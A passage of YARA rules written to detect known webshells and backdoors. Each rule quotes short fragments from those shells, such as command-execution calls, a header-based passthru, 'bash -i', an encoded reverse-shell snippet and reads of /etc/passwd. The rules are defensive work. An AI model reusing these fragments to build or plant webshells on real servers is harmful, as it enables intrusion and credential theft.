	$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
	$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
condition:
	2 of them
}
rule Jsp_Webshell_WebShell_JspWebshell_1_2
{
strings:
	$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
	$s1 = "String password=request.getParameter(\"password\");" fullword
	$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
	$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
	$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
	$s12 = "password = (String)session.getAttribute(\"password\");" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_safe0ver
{
strings:
	$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
	$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
	$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
	$s7 = "$contents .= htmlentities( $line ) ;" fullword
	$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
	$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
	$s20 = "/* <!-- End of Actions --> */" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_Uploader
{
strings:
	$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_php_webshells_kral
{
strings:
	$s1 = "$adres=gethostbyname($ip);" fullword
	$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
	$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
	$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
	$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
	$s20 = "<p><strong>Server listeleyici</strong><br />" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_cgitelnet
{
strings:
	$s9 = "# Author Homepage: http://www.rohitab.com/" fullword
	$s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
	$s18 = "# in a command line on Windows NT." fullword
	$s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_simple_backdoor
{
strings:
	$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
	$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
	$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
	$s3 = "        echo \"</pre>\";" fullword
	$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
	$s5 = "        echo \"<pre>\";" fullword
	$s6 = "if(isset($_REQUEST['cmd'])){" fullword
	$s7 = "        die;" fullword
	$s8 = "        system($cmd);" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_2
{
strings:
	$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
	$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
	$s4 = "$v = @ini_get(\"open_basedir\");" fullword
	$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_NTDaddy_v1_9
{
strings:
	$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
	$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
	$s13 = "<form action=ntdaddy.asp method=post>" fullword
	$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_lamashell
{
strings:
	$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
	$s8 = "$curcmd = $_POST['king'];" fullword
	$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
	$s18 = "<title>lama's'hell v. 3.0</title>" fullword
	$s19 = "_|_  O    _    O  _|_" fullword
	$s20 = "$curcmd = \"ls -lah\";" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_Simple_PHP_backdoor_by_DK
{
strings:
	$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
	$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
	$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
	$s6 = "if(isset($_REQUEST['cmd'])){" fullword
	$s8 = "system($cmd);" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_Moroccan_Spamers_Ma_EditioN_By_GhOsT
{
strings:
	$s4 = "$content = chunk_split(base64_encode($content)); " fullword
	$s12 = "print \"Sending mail to $to....... \"; " fullword
	$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_C99madShell_v__2_0_madnet_edition
{
strings:
	$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
	$s1 = "eval(gzinflate(base64_decode('"
	$s2 = "$pass = \"\";  //Pass" fullword
	$s3 = "$login = \"\"; //Login" fullword
	$s4 = "//Authentication" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_CmdAsp_asp_php
{
strings:
	$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
	$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
	$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
	$s6 = "' --------------------o0o--------------------" fullword
	$s8 = "' File: CmdAsp.asp" fullword
	$s11 = "<-- CmdAsp.asp -->" fullword
	$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
	$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
	$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
condition:
	4 of them
}
rule Php_Webshell_WebShell_NCC_Shell
{
strings:
	$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
	$s1 = "<b>--Coded by Silver" fullword
	$s2 = "<title>Upload - Shell/Datei</title>" fullword
	$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
	$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
	$s18 = "printf(\"Sie ist %u Bytes gro" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_php_webshells_README
{
strings:
	$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
	$s1 = "php-webshells" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_backupsql
{
strings:
	$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
	$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
	$s2 = "* as email attachment, or send to a remote ftp server by" fullword
	$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
	$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "
condition:
	2 of them
}
rule Php_Webshell_WebShell_AK_74_Security_Team_Web_Shell_Beta_Version
{
strings:
	$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
	$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
	$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_php_webshells_cpanel
{
strings:
	$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
	$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
	$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
	$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
	$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
	$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_accept_language
{
strings:
	$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_php_webshells_529
{
strings:
	$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
	$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
	$s9 = "echo '<PRE><P>This is exploit from <a " fullword
	$s10 = "This Exploit Was Edited By KingDefacer" fullword
	$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
	$s14 = "$hardstyle = explode(\"/\", $file); " fullword
	$s20 = "while($level--) chdir(\"..\"); " fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_STNC_WebShell_v0_8
{
strings:
	$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
	$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
	$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"
condition:
	2 of them
}
rule Php_Webshell_WebShell_php_webshells_tryag
{
strings:
	$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
	$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
	$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
	$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
	$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"
condition:
	3 of them
}
rule Php_Webshell_WebShell_dC3_Security_Crew_Shell_PRiV_2
{
strings:
	$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
	$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
	$s13 = "header(\"Content-type: image/gif\");" fullword
	$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
	$s20 = "if (isset($_GET['rename_all'])) {" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_qsd_php_backdoor
{
strings:
	$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
	$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
	$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
	$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_php_webshells_spygrup
{
strings:
	$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
	$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
	$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
	$s18 = "By KingDefacer From Spygrup.org>" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_Web_shell__c_ShAnKaR
{
strings:
	$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
	$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
	$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
	$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz
{
strings:
	$s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
	$s11 = "directory... Trust me - it works :-) */" fullword
	$s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
	$s16 = "} else if ($command == 'ls') {" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_Gamma_Web_Shell
{
strings:
	$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
	$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
	$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
	$s20 = "my $command = $self->query('command');" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_php_webshells_aspydrv
{
strings:
	$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
	$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
	$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
	$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
	$s20 = "' ---Copy Too Folder routine Start" fullword
condition:
	3 of them
}
rule Jsp_Webshell_WebShell_JspWebshell_1_2_2
{
strings:
	$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
	$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
	$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
	$s15 = "endPoint=random1.getFilePointer();" fullword
	$s20 = "if (request.getParameter(\"command\") != null) {" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_g00nshell_v1_3
{
strings:
	$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
	$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
	$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
	$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
	$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_WinX_Shell
{
strings:
	$s4 = "// It's simple shell for all Win OS." fullword
	$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
	$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
	$s13 = "// Created by greenwood from n57" fullword
	$s20 = " if (is_uploaded_file($userfile)) {" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_PHANTASMA
{
strings:
	$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
	$s15 = "if ($portscan != \"\") {" fullword
	$s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
	$s20 = "$dono = get_current_user( );" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_php_webshells_cw
{
strings:
	$s1 = "// Dump Database [pacucci.com]" fullword
	$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
	$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
	$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
	$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
	$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_php_include_w_shell
{
strings:
	$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
	$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
	$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_mysql_tool
{
strings:
	$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
	$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_PhpSpy_Ver_2006
{
strings:
	$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
	$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
	$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
	$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"
condition:
	1 of them
}
rule Php_Webshell_WebShell_ZyklonShell
{
strings:
	$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
	$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
	$s2 = "<TITLE>404 Not Found</TITLE>" fullword
	$s3 = "<H1>Not Found</H1>" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_php_webshells_myshell
{
strings:
	$s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
	$s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
	$s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
	$s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"
condition:
	1 of them
}
rule Php_Webshell_WebShell_php_webshells_lolipop
{
strings:
	$s3 = "$commander = $_POST['commander']; " fullword
	$s9 = "$sourcego = $_POST['sourcego']; " fullword
	$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_simple_cmd
{
strings:
	$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
	$s2 = "<title>G-Security Webshell</title>" fullword
	$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
	$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_go_shell
{
strings:
	$s0 = "#change this password; for power security - delete this file =)" fullword
	$s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
	$s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
	$s12 = "print << \"[kalabanga]\";" fullword
	$s13 = "<title>GO.cgi</title>" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_aZRaiLPhp_v1_0
{
strings:
	$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
	$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
	$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
	$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_webshells_zehir4
{
strings:
	$s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
	$s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"
condition:
	1 of them
}
rule Php_Webshell_WebShell_zehir4_asp_php
{
strings:
	$s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
	$s11 = "frames.byZehir.document.execCommand("
	$s15 = "frames.byZehir.document.execCommand(co"
condition:
	2 of them
}
rule Php_Webshell_WebShell_php_webshells_lostDC
{
strings:
	$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
	$s4 = "header ( \"Content-Description: Download manager\" );" fullword
	$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
	$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
	$s12 = "$ret = shellexec($command);" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_CasuS_1_5
{
strings:
	$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
	$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
	$s18 = "if (file_exists(\"F:\\\\\")){" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_ftpsearch
{
strings:
	$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
	$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
	$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
	$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0_
{
strings:
	$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
	$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
	$s11 = " *   Coded by Pixcher" fullword
	$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_soldierofallah
{
strings:
	$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
	$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
	$s3 = "$dt = $_POST['filecontent'];" fullword
	$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
	$s6 = "print \"Sorry, none of the command functions works.\";" fullword
	$s11 = "document.cmdform.command.value='';" fullword
	$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"
condition:
	3 of them
}
rule Php_Webshell_WebShell_Generic_PHP_7
{
strings:
	$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
	$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
	$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
	$s4 = "if( $action == \"dumpTable\" )" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall
{
strings:
	$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
	$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
	$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
	$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_Generic_PHP_8
{
strings:
	$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
	$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
	$s3 = "/* I added this to ensure the script will run correctly..." fullword
	$s14 = "<!--    </form>   -->" fullword
	$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
	$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell__PH_Vayv_PHVayv_PH_Vayv_klasvayv_asp_php
{
strings:
	$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
	$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
	$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
	$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"
condition:
	2 of them
}
rule Php_Webshell_WebShell_Generic_PHP_9
{
strings:
	$s2 = ":<b>\" .base64_decode($_POST['tot']). \"</b>\";" fullword
	$s6 = "if (isset($_POST['wq']) && $_POST['wq']<>\"\") {" fullword
	$s12 = "if (!empty($_POST['c'])){" fullword
	$s13 = "passthru($_POST['c']);" fullword
	$s16 = "<input type=\"radio\" name=\"tac\" value=\"1\">B64 Decode<br>" fullword
	$s20 = "<input type=\"radio\" name=\"tac\" value=\"3\">md5 Hash" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell__PH_Vayv_PHVayv_PH_Vayv
{
strings:
	$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
	$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
	$s17 = "name=\"duzenx2\" value=\"Klas" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_Generic_PHP_1
{
strings:
	$s1 = "$token = substr($_REQUEST['command'], 0, $length);" fullword
	$s4 = "var command_hist = new Array(<?php echo $js_command_hist ?>);" fullword
	$s7 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[1])," fullword
	$s9 = "document.shell.command.value = command_hist[current_line];" fullword
	$s16 = "$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $"
	$s19 = "if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {" fullword
	$s20 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword
condition:
	5 of them
}
rule Php_Webshell_WebShell_Generic_PHP_2
{
strings:
	$s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))" fullword
	$s4 = "\\$port = {$_POST['port']};" fullword
	$s5 = "$_POST['installpath'] = \"temp.pl\";}" fullword
	$s14 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u"
	$s16 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]"
condition:
	4 of them
}
rule Php_Webshell_WebShell__CrystalShell_v_1_erne_stres
{
strings:
	$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
	$s4 = "var_dump(curl_exec($ch));" fullword
	$s7 = "if(empty($_POST['Mohajer22'])){" fullword
	$s10 = "$m=$_POST['curl'];" fullword
	$s13 = "$u1p=$_POST['copy'];" fullword
	$s14 = "if(empty(\\$_POST['cmd'])){" fullword
	$s15 = "$string = explode(\"|\",$string);" fullword
	$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword
condition:
	5 of them
}
rule Php_Webshell_WebShell_Generic_PHP_3
{
strings:
	$s0 = "header('Content-Length:'.filesize($file).'');" fullword
	$s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
	$s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
	$s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
	$s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_Generic_PHP_4
{
strings:
	$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
	$s2 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword
	$s5 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword
	$s6 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword
	$s7 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword
	$s10 = "foreach ($arr as $filename) {" fullword
	$s19 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_GFS
{
strings:
	$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
	$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
	$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"
condition:
	all of them
}
rule Php_Webshell_WebShell__CrystalShell_v_1_sosyete_stres
{
strings:
	$s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
	$s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
	$s11 = "scrollbar-darkshadow-color: #101842;" fullword
	$s15 = "<a bookmark=\"minipanel\">" fullword
	$s16 = "background-color: #EBEAEA;" fullword
	$s18 = "color: #D5ECF9;" fullword
	$s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"
condition:
	all of them
}
rule Php_Webshell_WebShell_Generic_PHP_10
{
strings:
	$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
	$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
	$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
	$s12 = "else if( $mode & 0xA000 ) " fullword
	$s17 = "$s=sprintf(\"%1s\", $type); " fullword
	$s20 = "font-size: 8pt;" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_Generic_PHP_11
{
strings:
	$s5 = "$filename = $backupstring.\"$filename\";" fullword
	$s6 = "while ($file = readdir($folder)) {" fullword
	$s7 = "if($file != \".\" && $file != \"..\")" fullword
	$s9 = "$backupstring = \"copy_of_\";" fullword
	$s10 = "if( file_exists($file_name))" fullword
	$s13 = "global $file_name, $filename;" fullword
	$s16 = "copy($file,\"$filename\");" fullword
	$s18 = "<td width=\"49%\" height=\"142\">" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell__findsock_php_findsock_shell_php_reverse_shell
{
strings:
	$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_Generic_PHP_6
{
strings:
	$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
	$s5 = "echo shell_exec($com);" fullword
	$s7 = "if($sertype == \"winda\"){" fullword
	$s8 = "function execute($com)" fullword
	$s12 = "echo decode(execute($cmd));" fullword
	$s15 = "echo system($com);" fullword
condition:
	4 of them
}
rule Php_Webshell_Unpack_Injectt
{
strings:
	$s2 = "%s -Run                              -->To Install And Run The Service"
	$s3 = "%s -Uninstall                        -->To Uninstall The Service"
	$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"
condition:
	all of them
}
rule Php_Webshell_HYTop_DevPack_fso
{
strings:
	$s0 = "<!-- PageFSO Below -->"
	$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"
condition:
	all of them
}
rule Php_Webshell_FeliksPack3___PHP_Shells_ssh
{
strings:
